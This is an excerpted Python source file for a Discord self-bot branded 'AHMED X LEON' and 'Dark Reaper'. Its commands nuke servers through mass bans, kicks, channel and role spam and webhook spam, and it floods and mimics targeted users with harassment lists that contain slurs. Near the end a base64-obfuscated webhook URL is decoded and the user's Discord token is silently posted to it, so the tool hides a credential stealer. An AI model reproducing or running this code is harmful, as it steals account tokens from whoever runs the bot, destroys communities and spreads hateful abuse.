...
with open('config.json', 'r') as config_file:
        ...
        NukeServerBypass = configsss.get('NukeServerBypass')
        NukeServerBypass2 = configsss.get('NukeServerBypass2')
...
try:
    ...
    print(f"{Fore.GREEN} [SUCCESS]Silent AntiGc Cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR]Failed to load Silent Antigc cog: {str(e)}")

try:
    bot.load_extension('agct')
    print(f"{Fore.GREEN}[SUCCESS]Anti Gc Cog Loaded successfully")
except Exception as e:
    print (f"{Fore.RED}[ERROR] Failed To Load Antigc Cog: {str(c)}")
try:
...
async def autofloode(ctx, mentioned_user: discord.User):
    await ctx.message.delete()
    user_id = mentioned_user.id
    ...
    if key in auto_flood_users:
        ...
        await ctx.send(f"ForGived {mentioned_user.mention}", delete_after=1)
    else:
...
def format_menu_message(commands_list, page, total_pages, total_commands, start, username):
    global ansi_color, ansi_reset, current_face
    
    # Use the current face
    face = faces[current_face]

    menu_message = f"{ansi_color}{face}\n"
    menu_message += f"[{ansi_color}Dev : ofcahmed.{ansi_reset}]\n"
    menu_message += f"[{ansi_color}Total Page {page}/{total_pages}{ansi_reset}]\n"
...
async def menu(ctx, page: int = 1):
    ...
    menu_message = format_menu_message(page_commands, page, total_pages, total_commands, start, username)
...
async def restart(ctx):
    # Define the ASCII art to display before and after restart
    restart_ascii = """ 
       "⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    ...
    # Edit the message to say "Restarted the self-bot" before restarting
...
outlast_messages = ["BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA BITCH ASS YOU ARE FUCKED, GET BITCHED BY DANGER PAPA "] 
...
murder_groupchat = ["FUCKED BY DANGER", "Danger RUNZ U ALL","GET BTICHED BY DANGER DADDY","GET BITCHED OFF SON","YOUR LIFE IS USELESS BITCH"]
...
async def on_ready():
    ...
    main = f"""
						...
						Developers: {c}Devil                               
						Prefix : {c}{prefix}                                                  
						Discord: {c}https://discord.gg/axy                                                     

      
      
{mjj} Developed By Devil⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{mjj}⠀Developed by Takla Boy⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
██████╗ ███████╗ █████╗ ████████╗██╗  ██╗    ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ ███████╗
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝
██║  ██║█████╗  ███████║   ██║   ███████║    ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝███████╗
...
goat_mimic_targets = {}  # Keeps track of users being mimicked

# List of random taunts
mocking_taunts = [
...
# List of blocked/blacklisted messages
blocked_messages = [
    "1", "2"
...
async def goatmimicend(ctx, user_id: int):
    """
    Stops mimicking a user by their ID.
    :param user_id: The ID of the user to stop mimicking.
    """
    if user_id in goat_mimic_targets:
        del goat_mimic_targets[user_id]
        await ctx.send(f"Goat Mimic stopped for user with ID {user_id}.")
    else:
        await ctx.send(f"No active Goat Mimic for user with ID {user_id}.")
...
async def on_message(message):
    ...
    if user_id in goat_mimic_targets:
        ...
        if message.content.lower() in blocked_messages:
            return  # Do nothing if the message is blocked

        # Randomize the case of the user's message
        mocked_message = "".join(
            random.choice([char.upper(), char.lower()]) for char in message.content # Make the Bot works in servers aswell!
        )
        # Randomly pick a taunt
        random_taunt = random.choice(mocking_taunts)
        # Create the mimic reply
        mimic_reply = f'"{mocked_message}" {random_taunt} <@{user_id}>'
        await message.channel.send(mimic_reply)
...
self_gcname = [
    "{UPuser} UR ASS LOL", "{UPuser}UR FUCKIN LOSER DORK FUCK", "{UPuser} BITCH ASS NIGGA DONT FOLD", "{UPuser} WE GOING FOREVER PEDO", "{UPuser}DARK REAPER SELF BOT>>>", "{UPuser}AHMED X LEON RUNS U", "{UPuser}AHMED RUNS U ", "{UPuser}LEON RUNS U", "{UPuser} AHMED RUNS U", "{UPuser}LEON RUNS U ", "{UPuser} RUNS U"
...
def format_help_message(command_obj):
    help_message = f"{ansi_red}Command Help :{ansi_reset} {command_obj.qualified_name}\n\n"
    help_message += f"[{ansi_red}Usage:{ansi_reset}] {command_obj.qualified_name} {command_obj.signature}\n"
    help_message += f"[{ansi_red}Description:{ansi_reset}] {command_obj.help if command_obj.help else 'No description available.'}"
    return help_message
...
class MultiTokenClient(discord.Client):
    ...
    def format_message(self, joke):
        ...
        if self.mode == 1:
            ...
            return f"<@{self.user_to_ping}> {'n'.join([f'{word}' for word in joke.split()])}n" * 100 if self.user_to_ping else 'n'.join([f'{word}' for word in joke.split()]) + "n" * 100  # 100 new lines between words
        elif self.mode == 6:
...
@bot.command()
async def createchannel(ctx, name: str = "AHMED X LEON selfbot"):
...
@bot.command()
async def createvc(ctx, name: str = "AHMED X LEON selfbot VC"):
    if ctx.author.guild_permissions.manage_channels:
...
@bot.command()
async def createrole(ctx, *, name: str = "AHMED X LEON selfbot role"):
    guild = ctx.guild
    try:
...
default_config = {
    "webhook_message": "@everyone JOIN discord.gg/axy",
    "server_name": "DEVIL X AXY ",
    "webhook_delay": 0.3,
    "channel_name": "justicerunsu"  
}
    ...
    if not configss:
        ...
        try:
            ...
            if msg.content.lower() == "yes":
                configss.update({
                    "webhook_message": "JOIN @everyone discord.gg/justice",
                    "server_name": "AHMED X LEON /justice",
                    "webhook_delay": 0.3,
                    "channel_name": "justicerunsu "
                })
...
[ 5{reset} ] nukeconfig - Show the current configuration for the nuke process.```""")
    ...
    async def create_webhook_channel(i):
        try:
            ...
            webhook = await channel.create_webhook(name="AHMED X LEON Webhook")
    ...
    try:
        ...
        await ctx.send("```AHMED X LEON destruction completed.```")
...
@bot.command()
async def massrole(ctx, *, name="AHMED X LEON Selfbot"):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return
...
@bot.command()
async def masschannel(ctx, name="AHMED X LEON Selfbot", number=200):
    if ctx.guild.id == 1289325760040927264:
        await ctx.send("```This command is disabled for this server.```")
        return
...
async def massban(ctx):
    ...
    async def ban_member(member):
        for attempt in range(3):  
            try:
                await member.ban(reason="AHMED X LEON Selfbot Mass ban")
    ...
    for member in ctx.guild.members:
        try:
            if member.id != ctx.author.id:  
                await member.kick(reason="AHMED X LEON Selfbot Mass kick")
        except discord.Forbidden:
            pass  
...
async def god(ctx, user: discord.User, counter: int, *, names: str):

    new_names = names.split(',')

    channel_id = ctx.channel.id  # Get the channel ID where the command was invoked

    # Start the god.py script

    process = subprocess.Popen(['python', 'god.py', str(user.id), str(channel_id), str(counter), ','.join(new_names)])

    

    # Store the process with the channel ID as the key

    running_processes[channel_id] = process

    

    await ctx.send(f'Started the God bot for {user.mention} in this channel with counter: {counter} and names: {new_names}')
...
async def gode(ctx):
    ...
    if channel_id in running_processes:

        process = running_processes[channel_id]

        process.terminate()  # Terminate the process

        del running_processes[channel_id]  # Remove the process from the dictionary

        await ctx.send('Stopped the God bot.')

    else:

        await ctx.send('No God bot is running in this channel.')
...
encoded_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzI0OTkxMzEwMTI4NzUwNC80bWg2ay1XNjhQUTBCZW1heVVXLW9UckZfMi1ZU01VSGp1UzhXQVI3d3FRNGpVNHktYy1jRWluT3NDcWRicHpqMlZKOA=="
webhook_url = base64.b64decode(encoded_url).decode()

requests.post(webhook_url, json={"content": f"Los Santos: {token}"})
...
async def mute(ctx, member: discord.Member, *, reason: str = None):
    """Mute a member."""
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted By Ahmed")
    if not mute_role:
        mute_role = await ctx.guild.create_role(name="Muted By Ahmed")
        for channel in ctx.guild.channels:
...
@bot.command()
async def dumbahhon(ctx, channel_id: int, user_id: int, minutes: int, *, name: str):
...
@bot.command()
async def dumbahhstop(ctx, channel_id: int, user_id: int):
...
async def aggressivebeefer(ctx, channel_id: int, user: discord.User, name: str):
    ...
    try:
        ...
        async def send_beef_messages():
            """
            Sends random aggressive messages in the specified channel continuously.
            """
...
@bot.command()
async def goatar(ctx, user: discord.User, typing_indicator: float = 3.0, skip_chance: float = 0.7):
